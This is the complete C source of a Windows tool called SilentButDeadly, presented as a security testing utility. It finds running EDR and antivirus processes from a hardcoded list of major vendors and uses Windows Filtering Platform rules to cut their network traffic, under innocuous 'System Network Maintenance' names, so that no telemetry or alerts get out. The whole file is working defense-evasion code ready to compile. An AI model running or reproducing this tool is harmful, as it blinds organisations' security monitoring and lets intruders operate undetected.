/*
 * SilentButDeadly.c
 *
 * A Windows security testing tool that uses Windows Filtering Platform (WFP)
 * to block EDR/AV network communications without requiring kernel drivers.
 *
 * This tool creates temporary, non-persistent WFP rules that are automatically
 * removed when the program exits or the system reboots.
 *
 * Version: 1.0
 * - Network isolation only (no process termination)
 * - Clean, production-ready code structure
 */

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <time.h>
#include <fwpmu.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <ole2.h>
#include <Psapi.h>
#include <conio.h>

#pragma comment(lib, "Fwpuclnt.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Advapi32.lib")

/*------------------------------------------------------------------*/
/*                          CONSTANTS                               */
/*------------------------------------------------------------------*/
#define MAX_TARGETS           50                   // Maximum number of EDR targets
#define WFP_PROVIDER_NAME     L"System Network Maintenance Provider"
#define WFP_SUBLAYER_NAME     L"System Network Maintenance Sublayer"
#define STATUS_CHECK_INTERVAL 5000                 // Status check interval (ms)

// MalDevAcademy-style output macros
#define PRNT_WIN_ERR(szApiName)     printf("[!] %s Failed With Error: %d \n", szApiName, GetLastError())
#define PRNT_SUCCESS(szMessage)     printf("[+] %s\n", szMessage)
#define PRNT_INFO(szMessage)        printf("[i] %s\n", szMessage)
#define PRNT_WARNING(szMessage)     printf("[*] %s\n", szMessage)
#define PRNT_ERROR(szMessage)       printf("[-] %s\n", szMessage)

/*------------------------------------------------------------------*/
/*                         STRUCTURES                               */
/*------------------------------------------------------------------*/
typedef struct _EDR_TARGET {
    const char* processName;       // Process executable name
    const char* vendor;            // Vendor name
    BOOL        foundProcess;      // Whether process is currently running
    DWORD       processId;         // Current process ID
    BOOL        networkBlocked;    // Whether network has been blocked
} EDR_TARGET;

typedef struct _FILTER_RECORD {
    GUID   filterGuid;            // Filter GUID for removal
    char   processName[64];       // Associated process name
    BOOL   active;                // Whether filter is active
} FILTER_RECORD;

/*------------------------------------------------------------------*/
/*                     GLOBAL VARIABLES                             */
/*------------------------------------------------------------------*/
// Comprehensive EDR target list
EDR_TARGET g_EDRTargets[] = {
    // SentinelOne
    {"SentinelAgent.exe", "SentinelOne", FALSE, 0, FALSE},
    {"SentinelServiceHost.exe", "SentinelOne", FALSE, 0, FALSE},
    {"SentinelStaticEngine.exe", "SentinelOne", FALSE, 0, FALSE},
    {"SentinelUI.exe", "SentinelOne", FALSE, 0, FALSE},

    // CrowdStrike
    {"CSFalconService.exe", "CrowdStrike", FALSE, 0, FALSE},
    {"CSFalconContainer.exe", "CrowdStrike", FALSE, 0, FALSE},

    // Microsoft Defender
    {"MsMpEng.exe", "Microsoft Defender", FALSE, 0, FALSE},
    {"MsSense.exe", "Microsoft Defender ATP", FALSE, 0, FALSE},
    {"SenseIR.exe", "Microsoft Defender ATP", FALSE, 0, FALSE},
    {"SenseCncProxy.exe", "Microsoft Defender ATP", FALSE, 0, FALSE},

    // Carbon Black
    {"cb.exe", "Carbon Black", FALSE, 0, FALSE},
    {"RepMgr.exe", "Carbon Black", FALSE, 0, FALSE},
    {"RepUtils.exe", "Carbon Black", FALSE, 0, FALSE},
    {"RepWAV.exe", "Carbon Black", FALSE, 0, FALSE},
    {"RepWSC.exe", "Carbon Black", FALSE, 0, FALSE},

    // Cylance
    {"CylanceSvc.exe", "Cylance", FALSE, 0, FALSE},
    {"CyOptics.exe", "Cylance", FALSE, 0, FALSE},
    {"CyUpdate.exe", "Cylance", FALSE, 0, FALSE},

    // Symantec/Broadcom
    {"ccSvcHst.exe", "Symantec Endpoint Protection", FALSE, 0, FALSE},
    {"rtvscan.exe", "Symantec", FALSE, 0, FALSE},
    {"SymCorpUI.exe", "Symantec", FALSE, 0, FALSE},

    // McAfee/Trellix
    {"McTray.exe", "McAfee", FALSE, 0, FALSE},
    {"masvc.exe", "McAfee", FALSE, 0, FALSE},
    {"macmnsvc.exe", "McAfee", FALSE, 0, FALSE},
    {"mfemms.exe", "McAfee", FALSE, 0, FALSE},
    {"mfevtps.exe", "McAfee", FALSE, 0, FALSE},

    // Trend Micro
    {"PccNTMon.exe", "Trend Micro", FALSE, 0, FALSE},
    {"NTRTScan.exe", "Trend Micro", FALSE, 0, FALSE},
    {"TmListen.exe", "Trend Micro", FALSE, 0, FALSE},
    {"TmCCSF.exe", "Trend Micro", FALSE, 0, FALSE},

    // Sophos
    {"SSPService.exe", "Sophos", FALSE, 0, FALSE},
    {"SavService.exe", "Sophos", FALSE, 0, FALSE},
    {"SAVAdminService.exe", "Sophos", FALSE, 0, FALSE},
    {"SophosFIM.exe", "Sophos", FALSE, 0, FALSE},

    // Kaspersky
    {"avp.exe", "Kaspersky", FALSE, 0, FALSE},
    {"avpui.exe", "Kaspersky", FALSE, 0, FALSE},
    {"ksde.exe", "Kaspersky", FALSE, 0, FALSE},
    {"ksdeui.exe", "Kaspersky", FALSE, 0, FALSE},

    // ESET
    {"ekrn.exe", "ESET", FALSE, 0, FALSE},
    {"egui.exe", "ESET", FALSE, 0, FALSE},
    {"eOPPMonitor.exe", "ESET", FALSE, 0, FALSE},

    // Palo Alto Cortex XDR
    {"cyserver.exe", "Cortex XDR", FALSE, 0, FALSE},
    {"cytray.exe", "Cortex XDR", FALSE, 0, FALSE},
    {"CyveraService.exe", "Cortex XDR", FALSE, 0, FALSE},

    // FireEye
    {"xagt.exe", "FireEye", FALSE, 0, FALSE},
    {"xagtnotif.exe", "FireEye", FALSE, 0, FALSE},

    // Elastic Security
    {"elastic-agent.exe", "Elastic Security", FALSE, 0, FALSE},
    {"elastic-endpoint.exe", "Elastic Security", FALSE, 0, FALSE},

    {NULL, NULL, FALSE, 0, FALSE}  // Null terminator
};

// WFP Management
HANDLE g_EngineHandle      = NULL;
GUID   g_ProviderGuid      = {0};
GUID   g_SublayerGuid      = {0};
BOOL   g_WfpInitialized    = FALSE;

// Filter tracking
FILTER_RECORD g_FilterRecords[MAX_TARGETS * 4] = {0}; // 4 filters per target (IPv4/IPv6, In/Out)
int g_FilterCount = 0;

// Operation Control
BOOL   g_verboseMode       = TRUE;  // Default to verbose for educational purposes
volatile BOOL g_running    = TRUE;

/*------------------------------------------------------------------*/
/*                    FUNCTION DECLARATIONS                         */
/*------------------------------------------------------------------*/
// Core functions
BOOL FindEDRProcesses(void);
BOOL InitializeWFP(void);
BOOL BlockEDRCommunication(void);
BOOL RemoveBlockingRules(void);
void MonitorIsolation(void);
void DisplayStatus(void);
void Cleanup(void);

// Utility functions
void ClearScreen(void);
void WaitForUserInput(const char* szPrompt);
void PrintBanner(void);
void PrintWFPDetails(void);
BOOL WINAPI ConsoleCtrlHandler(DWORD ctrlType);
BOOL GetProcessImagePathW(DWORD pid, LPWSTR pBuffer, DWORD cchBuffer);
int CreateProcessFilters(const char* processName, FWP_BYTE_BLOB* pAppIdBlob);

/*------------------------------------------------------------------*/
/*                     UTILITY FUNCTIONS                            */
/*------------------------------------------------------------------*/

/**
 * Clear the console screen
 */
void ClearScreen(void)
{
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD count;
    DWORD cellCount;
    COORD homeCoords = {0, 0};

    if (hStdOut == INVALID_HANDLE_VALUE) return;

    // Get the number of cells in the current buffer
    if (!GetConsoleScreenBufferInfo(hStdOut, &csbi)) return;
    cellCount = csbi.dwSize.X * csbi.dwSize.Y;

    // Fill the entire buffer with spaces
    if (!FillConsoleOutputCharacter(hStdOut, (TCHAR)' ', cellCount, homeCoords, &count)) return;

    // Fill the entire buffer with the current colors and attributes
    if (!FillConsoleOutputAttribute(hStdOut, csbi.wAttributes, cellCount, homeCoords, &count)) return;

    // Move the cursor home
    SetConsoleCursorPosition(hStdOut, homeCoords);
}

/**
 * Wait for user input with prompt (MalDevAcademy style)
 * @param szPrompt The prompt message to display
 */
void WaitForUserInput(const char* szPrompt)
{
    printf("\n[#] %s", szPrompt);
    getchar();
    printf("\n");
}

/**
 * Print a banner with operation information
 */
void PrintBanner(void)
{
    ClearScreen();
    printf("===========================================================\n");
    printf("                  SilentButDeadly (v1.0)                   \n");
    printf("            Network Isolation for Security Testing         \n");
    printf("===========================================================\n");
    printf("[!] This tool blocks EDR network communications only\n");
    printf("[!] No processes will be terminated\n");
    printf("===========================================================\n\n");
}

/**
 * Print WFP technical details
 */
void PrintWFPDetails(void)
{
    printf("\n===========================================================\n");
    printf("              Windows Filtering Platform Details           \n");
    printf("===========================================================\n");
    PRNT_INFO("WFP is a kernel-mode filtering engine");
    PRNT_INFO("Creates dynamic, non-persistent filtering rules");
    PRNT_INFO("Rules are automatically removed on:");
    printf("    - Program termination\n");
    printf("    - System reboot\n");
    printf("    - Manual removal\n");
    PRNT_INFO("No registry modifications required");
    PRNT_INFO("No driver installation needed");
    printf("===========================================================\n");
}

/**
 * Console control handler for graceful shutdown
 */
BOOL WINAPI ConsoleCtrlHandler(DWORD ctrlType)
{
    if (ctrlType == CTRL_C_EVENT || ctrlType == CTRL_BREAK_EVENT) {
        printf("\n\n[*] Shutdown signal received...\n");
        g_running = FALSE;
        Sleep(1000); // Give time for clean shutdown
        return TRUE;
    }
    return FALSE;
}

/**
 * Get process image path in wide string format
 * @param pid Process ID
 * @param pBuffer Output buffer for path
 * @param cchBuffer Buffer size in characters
 * @return TRUE on success, FALSE on failure
 */
BOOL GetProcessImagePathW(DWORD pid, LPWSTR pBuffer, DWORD cchBuffer)
{
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        return FALSE;
    }

    BOOL ok = QueryFullProcessImageNameW(hProc, 0, pBuffer, &cchBuffer);
    CloseHandle(hProc);
    return ok;
}

/*------------------------------------------------------------------*/
/*                     CORE FUNCTIONS                               */
/*------------------------------------------------------------------*/

/**
 * Find and enumerate all EDR processes on the system
 * @return TRUE if any EDR processes were found, FALSE otherwise
 */
BOOL FindEDRProcesses(void)
{
    BOOL found = FALSE;
    HANDLE hSnapshot = NULL;
    PROCESSENTRY32 pe32 = {0};
    int detectedCount = 0;

    PRNT_INFO("Beginning comprehensive EDR/AV process scan...");
    PRNT_INFO("Checking for known security software...");

    // Take a snapshot of all running processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        PRNT_WIN_ERR("CreateToolhelp32Snapshot");
        return FALSE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process
    if (!Process32First(hSnapshot, &pe32)) {
        PRNT_WIN_ERR("Process32First");
        CloseHandle(hSnapshot);
        return FALSE;
    }

    printf("\n");
    PRNT_INFO("Scanning active processes...");

    // Loop through all processes
    do {
        // Check against our target list
        for (int i = 0; g_EDRTargets[i].processName != NULL; i++) {
            if (_stricmp(pe32.szExeFile, g_EDRTargets[i].processName) == 0) {
                g_EDRTargets[i].foundProcess = TRUE;
                g_EDRTargets[i].processId = pe32.th32ProcessID;

                printf("[+] Detected: %-25s (%-20s) - PID: %d\n",
                    g_EDRTargets[i].processName,
                    g_EDRTargets[i].vendor,
                    pe32.th32ProcessID);

                detectedCount++;
                found = TRUE;
            }
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    printf("\n");
    if (found) {
        printf("[+] Total EDR/AV processes detected: %d\n", detectedCount);
        PRNT_SUCCESS("EDR/AV components found and cataloged");
    } else {
        PRNT_WARNING("No known EDR/AV processes detected on this system");
    }

    return found;
}

/**
 * Cleanup function for graceful shutdown
 */
void Cleanup(void)
{
    printf("\n");
    PRNT_WARNING("Initiating cleanup procedures...");

    // Remove all WFP rules
    RemoveBlockingRules();

    // Reset all EDR target states
    for (int i = 0; g_EDRTargets[i].processName != NULL; i++) {
        g_EDRTargets[i].foundProcess = FALSE;
        g_EDRTargets[i].processId = 0;
        g_EDRTargets[i].networkBlocked = FALSE;
    }

    PRNT_SUCCESS("Cleanup completed");
}

/*------------------------------------------------------------------*/
/*                            MAIN                                  */
/*------------------------------------------------------------------*/
int main(int argc, char* argv[])
{
    BOOL isAdmin = FALSE;
    DWORD exitCode = 0;

    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (!_stricmp(argv[i], "-h") || !_stricmp(argv[i], "--help")) {
            printf("Usage: %s [options]\n", argv[0]);
            printf("Options:\n");
            printf("  -h, --help        Show this help message\n");
            printf("  -q, --quiet       Reduce verbosity\n");
            printf("\nThis tool blocks EDR network communications using WFP.\n");
            printf("No processes are terminated. All changes are temporary.\n");
            return 0;
        }
        else if (!_stricmp(argv[i], "-q") || !_stricmp(argv[i], "--quiet")) {
            g_verboseMode = FALSE;
        }
    }

    // Set up console handler
    SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);

    // Print banner
    PrintBanner();

    // Check for administrative privileges
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;

    PRNT_INFO("Performing privilege check...");

    if (AllocateAndInitializeSid(&NtAuthority, 2,
                                SECURITY_BUILTIN_DOMAIN_RID,
                                DOMAIN_ALIAS_RID_ADMINS,
                                0, 0, 0, 0, 0, 0,
                                &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
        FreeSid(AdministratorsGroup);
    }

    if (!isAdmin) {
        PRNT_ERROR("This program requires administrative privileges");
        PRNT_INFO("Please run as Administrator");
        printf("\n[!] Administrative access is required to:");
        printf("\n    - Access Windows Filtering Platform");
        printf("\n    - Create network filtering rules");
        printf("\n    - Query process information\n");
        return -1;
    }

    PRNT_SUCCESS("Running with administrative privileges");

    // Show WFP details
    PrintWFPDetails();

    WaitForUserInput("Press <Enter> to begin EDR detection ... ");

    // Step 1: Detect EDR processes
    printf("===========================================================\n");
    printf("                   Step 1: EDR Detection                   \n");
    printf("===========================================================\n\n");

    if (!FindEDRProcesses()) {
        PRNT_WARNING("No EDR/AV processes detected on this system");
        PRNT_INFO("Nothing to isolate - exiting");

        WaitForUserInput("Press <Enter> to exit ... ");
        return 0;
    }

    WaitForUserInput("Press <Enter> to initialize Windows Filtering Platform ... ");

    // Step 2: Initialize WFP
    printf("\n===========================================================\n");
    printf("                  Step 2: WFP Initialization               \n");
    printf("===========================================================\n\n");

    if (!InitializeWFP()) {
        PRNT_ERROR("Failed to initialize Windows Filtering Platform");
        PRNT_INFO("Cannot proceed with network isolation");
        exitCode = 1;
        goto cleanup;
    }

    WaitForUserInput("Press <Enter> to install network isolation filters ... ");

    // Step 3: Block EDR communications
    printf("\n===========================================================\n");
    printf("                Step 3: Network Isolation                  \n");
    printf("===========================================================\n\n");

    if (!BlockEDRCommunication()) {
        PRNT_ERROR("Failed to establish network isolation");
        exitCode = 1;
        goto cleanup;
    }

    printf("\n");
    PRNT_SUCCESS("Network isolation is now active!");
    PRNT_INFO("EDR processes cannot communicate with cloud services");
    PRNT_INFO("No telemetry or alerts can be sent");

    WaitForUserInput("Press <Enter> to begin monitoring ... ");

    // Step 4: Monitor isolation
    printf("\n===========================================================\n");
    printf("                   Step 4: Monitoring                      \n");
    printf("===========================================================\n\n");

    MonitorIsolation();

cleanup:
    printf("\n===========================================================\n");
    printf("                    Cleanup & Restoration                  \n");
    printf("===========================================================\n\n");

    Cleanup();

    printf("\n");
    PRNT_INFO("Operation complete");

    if (exitCode == 0) {
        PRNT_SUCCESS("All operations completed successfully");
    } else {
        PRNT_ERROR("Operation completed with errors");
    }

    WaitForUserInput("Press <Enter> to exit ... ");

    return exitCode;
}

/**
 * Initialize Windows Filtering Platform for network blocking
 * @return TRUE on success, FALSE on failure
 */
BOOL InitializeWFP(void)
{
    DWORD status = ERROR_SUCCESS;

    PRNT_INFO("Initializing Windows Filtering Platform...");

    // Initialize COM
    PRNT_INFO("Initializing COM subsystem...");
    if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) {
        PRNT_ERROR("Failed to initialize COM");
        return FALSE;
    }
    PRNT_SUCCESS("COM initialized");

    // Create random GUIDs for WFP objects
    PRNT_INFO("Generating unique identifiers for WFP objects...");
    if (FAILED(CoCreateGuid(&g_ProviderGuid))) {
        PRNT_ERROR("Failed to create provider GUID");
        CoUninitialize();
        return FALSE;
    }

    if (FAILED(CoCreateGuid(&g_SublayerGuid))) {
        PRNT_ERROR("Failed to create sublayer GUID");
        CoUninitialize();
        return FALSE;
    }
    PRNT_SUCCESS("WFP identifiers generated");

    // Initialize WFP engine with dynamic session
    PRNT_INFO("Opening WFP engine with dynamic session...");
    FWPM_SESSION session = {0};
    session.flags = FWPM_SESSION_FLAG_DYNAMIC;  // Non-persistent rules

    status = FwpmEngineOpen(
        NULL,               // Local machine
        RPC_C_AUTHN_WINNT,  // Windows authentication
        NULL,               // Default auth info
        &session,           // Dynamic session
        &g_EngineHandle     // Output handle
    );

    if (status != ERROR_SUCCESS) {
        printf("[!] Failed to open WFP engine: 0x%08X\n", status);
        CoUninitialize();
        return FALSE;
    }
    PRNT_SUCCESS("WFP engine opened successfully");

    // Begin a transaction
    PRNT_INFO("Beginning WFP transaction...");
    status = FwpmTransactionBegin(g_EngineHandle, 0);
    if (status != ERROR_SUCCESS) {
        printf("[!] Failed to begin WFP transaction: 0x%08X\n", status);
        FwpmEngineClose(g_EngineHandle);
        g_EngineHandle = NULL;
        CoUninitialize();
        return FALSE;
    }
    PRNT_SUCCESS("WFP transaction started");

    // Create a provider (non-persistent)
    PRNT_INFO("Creating WFP provider...");
    FWPM_PROVIDER provider = {0};
    provider.providerKey = g_ProviderGuid;
    provider.displayData.name = WFP_PROVIDER_NAME;
    provider.displayData.description = L"Temporary provider for network maintenance operations";
    // Note: No FWPM_PROVIDER_FLAG_PERSISTENT flag

    status = FwpmProviderAdd(g_EngineHandle, &provider, NULL);
    if (status != ERROR_SUCCESS) {
        printf("[!] Failed to add WFP provider: 0x%08X\n", status);
        FwpmTransactionAbort(g_EngineHandle);
        FwpmEngineClose(g_EngineHandle);
        g_EngineHandle = NULL;
        CoUninitialize();
        return FALSE;
    }
    PRNT_SUCCESS("WFP provider created");

    // Create a sublayer
    PRNT_INFO("Creating WFP sublayer...");
    FWPM_SUBLAYER sublayer = {0};
    sublayer.subLayerKey = g_SublayerGuid;
    sublayer.displayData.name = WFP_SUBLAYER_NAME;
    sublayer.displayData.description = L"High-priority sublayer for network filtering";
    sublayer.providerKey = &g_ProviderGuid;
    sublayer.weight = 0xFFFF; // Maximum priority

    status = FwpmSubLayerAdd(g_EngineHandle, &sublayer, NULL);
    if (status != ERROR_SUCCESS) {
        printf("[!] Failed to add WFP sublayer: 0x%08X\n", status);
        FwpmTransactionAbort(g_EngineHandle);
        FwpmEngineClose(g_EngineHandle);
        g_EngineHandle = NULL;
        CoUninitialize();
        return FALSE;
    }
    PRNT_SUCCESS("WFP sublayer created");

    // Commit the transaction
    PRNT_INFO("Committing WFP configuration...");
    status = FwpmTransactionCommit(g_EngineHandle);
    if (status != ERROR_SUCCESS) {
        printf("[!] Failed to commit WFP transaction: 0x%08X\n", status);
        FwpmEngineClose(g_EngineHandle);
        g_EngineHandle = NULL;
        CoUninitialize();
        return FALSE;
    }

    PRNT_SUCCESS("WFP initialization complete");
    g_WfpInitialized = TRUE;
    return TRUE;
}

/**
 * Create blocking filters for a specific process
 * @param processName Process name for logging
 * @param pAppIdBlob Application ID blob from WFP
 * @return Number of filters successfully created
 */
int CreateProcessFilters(const char* processName, FWP_BYTE_BLOB* pAppIdBlob)
{
    DWORD status;
    int filtersCreated = 0;

    // Layer definitions for comprehensive blocking
    struct {
        const GUID* layerKey;
        const wchar_t* description;
    } layers[] = {
        {&FWPM_LAYER_ALE_AUTH_CONNECT_V4, L"Block IPv4 outbound connections"},
        {&FWPM_LAYER_ALE_AUTH_CONNECT_V6, L"Block IPv6 outbound connections"},
        {&FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4, L"Block IPv4 inbound connections"},
        {&FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6, L"Block IPv6 inbound connections"}
    };

    for (int i = 0; i < 4; i++) {
        FWPM_FILTER filter = {0};
        FWPM_FILTER_CONDITION filterConditions[1] = {0};

        // Generate unique GUID for this filter
        GUID filterGuid;
        if (FAILED(CoCreateGuid(&filterGuid))) {
            continue;
        }

        // Configure filter condition
        filterConditions[0].fieldKey = FWPM_CONDITION_ALE_APP_ID;
        filterConditions[0].matchType = FWP_MATCH_EQUAL;
        filterConditions[0].conditionValue.type = FWP_BYTE_BLOB_TYPE;
        filterConditions[0].conditionValue.byteBlob = pAppIdBlob;

        // Configure filter
        filter.filterKey = filterGuid;
        filter.displayData.name = L"EDR Network Block";
        filter.displayData.description = layers[i].description;
        filter.providerKey = &g_ProviderGuid;
        filter.layerKey = *layers[i].layerKey;
        filter.subLayerKey = g_SublayerGuid;
        filter.weight.type = FWP_EMPTY;
        filter.numFilterConditions = 1;
        filter.filterCondition = filterConditions;
        filter.action.type = FWP_ACTION_BLOCK;
        filter.flags = FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT;

        // Add the filter
        status = FwpmFilterAdd(g_EngineHandle, &filter, NULL, NULL);
        if (status == ERROR_SUCCESS) {
            // Record the filter
            if (g_FilterCount < (MAX_TARGETS * 4)) {
                g_FilterRecords[g_FilterCount].filterGuid = filterGuid;
                strncpy_s(g_FilterRecords[g_FilterCount].processName,
                         sizeof(g_FilterRecords[g_FilterCount].processName),
                         processName, _TRUNCATE);
                g_FilterRecords[g_FilterCount].active = TRUE;
                g_FilterCount++;
            }
            filtersCreated++;
        }
    }

    return filtersCreated;
}

/**
 * Block network communication for all detected EDR processes
 * @return TRUE if any blocking was successful, FALSE otherwise
 */
BOOL BlockEDRCommunication(void)
{
    DWORD status = ERROR_SUCCESS;
    BOOL anyBlocked = FALSE;
    int totalFilters = 0;

    printf("\n");
    PRNT_WARNING("Beginning EDR network isolation...");

    // Begin a new transaction for filters
    PRNT_INFO("Starting filter installation transaction...");
    status = FwpmTransactionBegin(g_EngineHandle, 0);
    if (status != ERROR_SUCCESS) {
        printf("[!] Failed to begin filter transaction: 0x%08X\n", status);
        return FALSE;
    }

    printf("\n");
    PRNT_INFO("Installing network filters for detected processes...");

    // Process each detected EDR
    for (int i = 0; g_EDRTargets[i].processName != NULL; i++) {
        if (!g_EDRTargets[i].foundProcess) {
            continue;
        }

        printf("\n[*] Processing %s (PID: %d)...\n",
               g_EDRTargets[i].processName,
               g_EDRTargets[i].processId);

        // Get the process image path
        WCHAR imagePathW[MAX_PATH] = {0};
        if (!GetProcessImagePathW(g_EDRTargets[i].processId, imagePathW, MAX_PATH)) {
            PRNT_ERROR("  Failed to retrieve process path");
            continue;
        }

        if (g_verboseMode) {
            wprintf(L"[i]   Image path: %s\n", imagePathW);
        }

        // Convert path to AppID blob
        FWP_BYTE_BLOB* pAppIdBlob = NULL;
        status = FwpmGetAppIdFromFileName0(imagePathW, &pAppIdBlob);
        if (status != ERROR_SUCCESS) {
            printf("[-]   Failed to create AppID blob: 0x%08X\n", status);
            continue;
        }

        PRNT_INFO("  Creating blocking filters...");

        // Create filters for this process
        int filtersCreated = CreateProcessFilters(g_EDRTargets[i].processName, pAppIdBlob);

        // Clean up the blob
        FwpmFreeMemory0((void**)&pAppIdBlob);

        if (filtersCreated > 0) {
            printf("[+]   Successfully created %d filters\n", filtersCreated);
            g_EDRTargets[i].networkBlocked = TRUE;
            totalFilters += filtersCreated;
            anyBlocked = TRUE;
        } else {
            PRNT_ERROR("  Failed to create any filters");
        }
    }

    printf("\n");

    // Commit or abort based on success
    if (anyBlocked) {
        PRNT_INFO("Committing network filters...");
        status = FwpmTransactionCommit(g_EngineHandle);
        if (status != ERROR_SUCCESS) {
            printf("[!] Failed to commit filter transaction: 0x%08X\n", status);
            FwpmTransactionAbort(g_EngineHandle);
            return FALSE;
        }

        printf("\n");
        printf("[+] Network isolation established successfully\n");
        printf("[+] Total filters installed: %d\n", totalFilters);
        printf("[+] Processes isolated: %d\n", totalFilters / 4); // 4 filters per process
    } else {
        PRNT_WARNING("No filters were created");
        FwpmTransactionAbort(g_EngineHandle);
    }

    return anyBlocked;
}

/**
 * Display current isolation status
 */
void DisplayStatus(void)
{
    printf("\n===========================================================\n");
    printf("                Current Isolation Status                   \n");
    printf("===========================================================\n");

    int blockedCount = 0;
    for (int i = 0; g_EDRTargets[i].processName != NULL; i++) {
        if (g_EDRTargets[i].networkBlocked) {
            printf("[BLOCKED] %-25s - %s\n",
                   g_EDRTargets[i].processName,
                   g_EDRTargets[i].vendor);
            blockedCount++;
        }
    }

    if (blockedCount == 0) {
        PRNT_WARNING("No processes currently isolated");
    } else {
        printf("\nTotal processes isolated: %d\n", blockedCount);
    }

    printf("===========================================================\n");
}

/**
 * Monitor and maintain network isolation
 */
void MonitorIsolation(void)
{
    time_t startTime = time(NULL);
    int cycleCount = 0;

    PRNT_INFO("Entering monitoring mode...");
    PRNT_INFO("Press Ctrl+C to stop monitoring and remove filters");

    while (g_running) {
        Sleep(STATUS_CHECK_INTERVAL);

        if (!g_running) break;

        cycleCount++;
        time_t elapsed = time(NULL) - startTime;

        // Update status every 5 seconds in verbose mode
        if (g_verboseMode && (cycleCount % 5 == 0)) {
            // Clear screen and show status
            ClearScreen();
            PrintBanner();

            printf("\n[*] Monitoring active - Runtime: %lld seconds\n", (long long)elapsed);
            printf("[*] Status check cycle: %d\n", cycleCount);

            DisplayStatus();

            printf("\n[i] Network isolation is active\n");
            printf("[i] EDR processes cannot communicate with their servers\n");
            printf("[i] Press Ctrl+C to restore normal operation\n");
        }
    }
}

/**
 * Remove all blocking filters and restore network connectivity
 * @return TRUE on success, FALSE on failure
 */
BOOL RemoveBlockingRules(void)
{
    if (!g_WfpInitialized || g_EngineHandle == NULL) {
        return TRUE; // Nothing to clean up
    }

    DWORD status = ERROR_SUCCESS;

    printf("\n");
    PRNT_WARNING("Removing network isolation filters...");

    // Begin a transaction
    PRNT_INFO("Starting filter removal transaction...");
    status = FwpmTransactionBegin(g_EngineHandle, 0);
    if (status != ERROR_SUCCESS) {
        printf("[!] Failed to begin cleanup transaction: 0x%08X\n", status);
    }

    // Remove the provider (cascades to all filters and sublayers)
    PRNT_INFO("Removing WFP provider and all associated filters...");
    status = FwpmProviderDeleteByKey(g_EngineHandle, &g_ProviderGuid);
    if (status != ERROR_SUCCESS && status != FWP_E_PROVIDER_NOT_FOUND) {
        printf("[!] Failed to remove provider: 0x%08X\n", status);
    }

    // Commit the transaction
    status = FwpmTransactionCommit(g_EngineHandle);
    if (status != ERROR_SUCCESS) {
        PRNT_ERROR("Failed to commit cleanup transaction");
        FwpmTransactionAbort(g_EngineHandle);
    } else {
        PRNT_SUCCESS("All filters removed successfully");
    }

    // Close the engine
    PRNT_INFO("Closing WFP engine...");
    FwpmEngineClose(g_EngineHandle);
    g_EngineHandle = NULL;
    g_WfpInitialized = FALSE;

    // Uninitialize COM
    CoUninitialize();

    PRNT_SUCCESS("Network connectivity restored");
    PRNT_INFO("EDR processes can now communicate normally");

    // Clear filter records
    g_FilterCount = 0;
    memset(g_FilterRecords, 0, sizeof(g_FilterRecords));

    return TRUE;
}
